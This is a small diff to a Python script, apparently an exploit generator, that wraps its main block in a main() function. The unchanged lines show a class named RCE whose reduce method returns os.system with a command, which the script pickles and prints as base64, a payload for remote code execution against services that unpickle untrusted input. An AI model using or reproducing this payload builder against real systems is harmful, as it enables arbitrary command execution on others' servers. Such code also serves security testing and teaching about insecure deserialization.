@@ -20,6 +20,10 @@ class RCE:
         return os.system, (cmd,)
 
 
-if __name__ == "__main__":
+def main():
     pickled = pickle.dumps(RCE())
     print(base64.urlsafe_b64encode(pickled))
+
+
+if __name__ == "__main__":
+    main()
